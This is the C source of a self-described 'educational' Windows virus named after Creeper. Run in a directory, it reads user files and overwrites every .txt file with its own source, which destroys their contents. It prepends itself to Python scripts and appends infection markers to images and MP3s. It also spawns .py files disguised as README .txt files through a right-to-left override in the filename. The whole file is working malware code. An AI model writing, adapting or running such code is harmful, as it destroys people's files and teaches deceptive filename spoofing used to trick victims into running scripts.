/*
 * Creeper (1971) - Educational virus (C version)
 * Compile (MinGW): gcc creeper.c -o creeper.exe
 *
 * Uses Win32 API for directory traversal and file operations.
 */

#define _WIN32_WINNT 0x0600
#include <windows.h>
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <time.h>
#include <direct.h>

#define SELF_SOURCE "creeper.c"
#define RTL "\xE2\x80\xAE"  /* UTF-8 encoding of U+202E */
#define MAX_PATH_LEN 260

int read_count = 0;
int infect_count = 0;
int rtl_count = 0;

/* ── UTILITY ───────────────────────────────────── */

char* read_source(void) {
    FILE *f = fopen(SELF_SOURCE, "rb");
    if (!f) return strdup("// source unavailable\n");
    fseek(f, 0, SEEK_END);
    long sz = ftell(f);
    fseek(f, 0, SEEK_SET);
    char *buf = malloc(sz + 1);
    fread(buf, 1, sz, f);
    buf[sz] = 0;
    fclose(f);
    return buf;
}

int file_exists(const char *path) {
    return GetFileAttributesA(path) != INVALID_FILE_ATTRIBUTES;
}

int file_size(const char *path) {
    HANDLE h = CreateFileA(path, GENERIC_READ, FILE_SHARE_READ, NULL,
                           OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (h == INVALID_HANDLE_VALUE) return -1;
    DWORD sz = GetFileSize(h, NULL);
    CloseHandle(h);
    return (int)sz;
}

int file_contains(const char *path, const char *marker) {
    FILE *f = fopen(path, "rb");
    if (!f) return 0;
    char buf[4096];
    int found = 0;
    while (fread(buf, 1, sizeof(buf), f) > 0) {
        if (strstr(buf, marker)) { found = 1; break; }
    }
    fclose(f);
    return found;
}

/* ── EXFILTRATE ────────────────────────────────── */

void exfiltrate(const char *path) {
    const char *name = strrchr(path, '\\');
    name = name ? name + 1 : path;
    const char *ext = strrchr(name, '.');
    ext = ext ? ext + 1 : "";

    int sz = file_size(path);
    if (sz < 0) return;

    if (_stricmp(ext, "txt") == 0) {
        char content[4096] = {0};
        FILE *f = fopen(path, "r");
        if (f) {
            int lines = 0;
            while (fgets(content, sizeof(content), f)) lines++;
            fclose(f);
            printf("[creep] reading: %s (exfiltrated %d bytes, %d lines)\n", name, sz, lines);
        }
    } else if (_stricmp(ext, "csv") == 0) {
        int rows = 0; char c;
        FILE *f = fopen(path, "r");
        if (f) { while ((c = fgetc(f)) != EOF) if (c == '\n') rows++; fclose(f); }
        printf("[creep] reading: %s (parsed %d rows)\n", name, rows);
    } else if (_stricmp(ext, "html") == 0) {
        int tags = 0; char c;
        FILE *f = fopen(path, "r");
        if (f) { while ((c = fgetc(f)) != EOF) if (c == '<') tags++; fclose(f); }
        printf("[creep] reading: %s (found %d HTML tags)\n", name, tags);
    } else if (_stricmp(ext, "md") == 0) {
        int headers = 0; char line[1024];
        FILE *f = fopen(path, "r");
        if (f) { while (fgets(line, sizeof(line), f)) if (line[0] == '#') headers++; fclose(f); }
        printf("[creep] reading: %s (found %d headers)\n", name, headers);
    } else if (_stricmp(ext, "py") == 0) {
        int lines = 0; char c;
        FILE *f = fopen(path, "r");
        if (f) { while ((c = fgetc(f)) != EOF) if (c == '\n') lines++; fclose(f); }
        printf("[creep] reading: %s (script, %d lines)\n", name, lines);
    } else if (_stricmp(ext, "png") == 0 || _stricmp(ext, "jpg") == 0 ||
               _stricmp(ext, "jpeg") == 0 || _stricmp(ext, "mp3") == 0) {
        printf("[creep] reading: %s (%d bytes, binary)\n", name, sz);
    } else if (_stricmp(ext, "docx") == 0 || _stricmp(ext, "xlsx") == 0 ||
               _stricmp(ext, "pptx") == 0) {
        printf("[creep] reading: %s (office document, %d bytes)\n", name, sz);
    } else {
        return;
    }
    read_count++;
}

/* ── INFECT ────────────────────────────────────── */

int infect_file(const char *path, const char *code) {
    const char *name = strrchr(path, '\\');
    name = name ? name + 1 : path;
    const char *ext = strrchr(name, '.');
    ext = ext ? ext + 1 : "";

    if (strstr(name, "README") == name || strstr(name, RTL)) return 0;
    if (strcmp(name, SELF_SOURCE) == 0) return 0;
    if (strstr(name, ".exe") || strstr(name, ".go") || strstr(name, ".nim") ||
        strstr(name, ".c") || strstr(name, ".cpp") || strcmp(name, "setup_lab.py") == 0) return 0;

    if (_stricmp(ext, "py") == 0) {
        FILE *f = fopen(path, "r");
        if (!f) return 0;
        fseek(f, 0, SEEK_END);
        long orig_sz = ftell(f);
        fseek(f, 0, SEEK_SET);
        char *orig = malloc(orig_sz + 1);
        fread(orig, 1, orig_sz, f);
        orig[orig_sz] = 0;
        fclose(f);

        FILE *out = fopen(path, "w");
        if (!out) { free(orig); return 0; }
        fprintf(out, "%s\n# === INFECTED BY CREEPER ===\n%s", code, orig);
        fclose(out);
        free(orig);
        printf("[creep] infected: %s (prepended virus code)\n", name);
        return 1;

    } else if (_stricmp(ext, "txt") == 0) {
        FILE *f = fopen(path, "w");
        if (!f) return 0;
        fprintf(f, "%s", code);
        fclose(f);
        printf("[creep] infected: %s (overwritten with virus)\n", name);
        return 1;
    }
    return 0;
}

int infect_binary(const char *path) {
    const char *name = strrchr(path, '\\');
    name = name ? name + 1 : path;
    const char *ext = strrchr(name, '.');
    ext = ext ? ext + 1 : "";

    if (strstr(name, RTL) || strcmp(name, SELF_SOURCE) == 0) return 0;
    if (file_contains(path, "[CREEPER-INFECTED]")) return 0;

    char marker[256];
    snprintf(marker, sizeof(marker), "\n[CREEPER-INFECTED]\nTimestamp: %ld\n", time(NULL));
    int marker_len = strlen(marker);

    if (_stricmp(ext, "png") == 0) {
        FILE *f = fopen(path, "rb");
        if (!f) return 0;
        fseek(f, 0, SEEK_END);
        long sz = ftell(f);
        fseek(f, 0, SEEK_SET);
        unsigned char *data = malloc(sz + marker_len + 1);
        fread(data, 1, sz, f);
        fclose(f);

        /* Find IEND (12 byte chunk after IEND marker) */
        int found = 0;
        for (long i = 0; i < sz - 4; i++) {
            if (data[i] == 'I' && data[i+1] == 'E' && data[i+2] == 'N' && data[i+3] == 'D') {
                long pos = i + 8;
                memmove(data + pos + marker_len, data + pos, sz - pos);
                memcpy(data + pos, marker, marker_len);
                long new_sz = sz + marker_len;
                FILE *out = fopen(path, "wb");
                if (out) { fwrite(data, 1, new_sz, out); fclose(out); }
                printf("[creep] infected: %s (appended marker after IEND)\n", name);
                free(data);
                return 1;
            }
        }
        free(data);

    } else if (_stricmp(ext, "jpg") == 0 || _stricmp(ext, "jpeg") == 0) {
        FILE *f = fopen(path, "rb");
        if (!f) return 0;
        fseek(f, 0, SEEK_END);
        long sz = ftell(f);
        fseek(f, 0, SEEK_SET);
        unsigned char *data = malloc(sz + marker_len + 2);
        fread(data, 1, sz, f);
        fclose(f);

        if (sz >= 2 && data[sz-2] == 0xFF && data[sz-1] == 0xD9) {
            memcpy(data + sz - 2, marker, marker_len);
            data[sz - 2 + marker_len] = 0xFF;
            data[sz - 2 + marker_len + 1] = 0xD9;
            long new_sz = sz + marker_len;
            FILE *out = fopen(path, "wb");
            if (out) { fwrite(data, 1, new_sz, out); fclose(out); }
            printf("[creep] infected: %s (appended marker before EOI)\n", name);
            free(data);
            return 1;
        }
        free(data);

    } else if (_stricmp(ext, "mp3") == 0) {
        FILE *f = fopen(path, "ab");
        if (!f) return 0;
        fwrite(marker, 1, marker_len, f);
        fclose(f);
        printf("[creep] infected: %s (appended marker)\n", name);
        return 1;
    }
    return 0;
}

int spawn_rtl(const char *code) {
    int count = 0;
    for (int i = 0; i < 3; i++) {
        char name[MAX_PATH_LEN];
        snprintf(name, sizeof(name), "README%d%stxt.py", i, RTL);
        if (!file_exists(name)) {
            FILE *f = fopen(name, "wb");
            if (f) {
                fprintf(f, "%s", code);
                fclose(f);
                printf("[creep] RTL-spawned: %s\n", name);
                printf("        (looks like README%d.txt in Explorer)\n", i);
                count++;
            }
        }
    }
    return count;
}

void write_log(void) {
    FILE *f = fopen("infection.log", "w");
    if (!f) return;
    fprintf(f, "=== CREEPER VIRUS - INFECTION LOG ===\n");
    fprintf(f, "Execution: %ld\n", time(NULL));
    fprintf(f, "Source: %s\n\n", SELF_SOURCE);
    fprintf(f, "\nFiles read: %d\n", read_count);
    fprintf(f, "Files infected: %d\n", infect_count);
    fprintf(f, "  - regular:  %d\n", infect_count - rtl_count);
    fprintf(f, "  - RTL clones: %d\n", rtl_count);
    fprintf(f, "======================================\n");
    fclose(f);
}

/* ── MAIN ──────────────────────────────────────── */

int main(void) {
    printf("I'M THE CREEPER: CATCH ME IF YOU CAN.\n\n");

    char *code = read_source();

    /* 1. READ */
    WIN32_FIND_DATA ffd;
    HANDLE hFind = FindFirstFile("*", &ffd);
    if (hFind != INVALID_HANDLE_VALUE) {
        do {
            if (!(ffd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)) {
                const char *name = ffd.cFileName;
                if (strcmp(name, SELF_SOURCE) == 0) continue;
                if (strcmp(name, "setup_lab.py") == 0) continue;
                if (strstr(name, "README") == name) continue;
                exfiltrate(name);
            }
        } while (FindNextFile(hFind, &ffd) != 0);
        FindClose(hFind);
    }

    /* 2. INFECT */
    hFind = FindFirstFile("*", &ffd);
    if (hFind != INVALID_HANDLE_VALUE) {
        do {
            if (!(ffd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)) {
                const char *name = ffd.cFileName;
                const char *ext = strrchr(name, '.');
                ext = ext ? ext + 1 : "";
                if (_stricmp(ext, "py") == 0 || _stricmp(ext, "txt") == 0) {
                    if (infect_file(name, code)) infect_count++;
                } else if (_stricmp(ext, "png") == 0 || _stricmp(ext, "jpg") == 0 ||
                           _stricmp(ext, "jpeg") == 0 || _stricmp(ext, "mp3") == 0) {
                    if (infect_binary(name)) infect_count++;
                }
            }
        } while (FindNextFile(hFind, &ffd) != 0);
        FindClose(hFind);
    }

    /* 3. RTL */
    rtl_count = spawn_rtl(code);
    infect_count += rtl_count;

    /* 4. Log */
    write_log();

    /* 5. Report */
    printf("\n[creep] activity logged to: infection.log\n");
    printf("[creep] files read:     %d\n", read_count);
    printf("[creep] files infected: %d\n", infect_count);
    printf("[creep]   - regular:  %d\n", infect_count - rtl_count);
    printf("[creep]   - RTL clones: %d\n", rtl_count);
    printf("[creep] use antivirus to remove me\n");

    free(code);
    return 0;
}
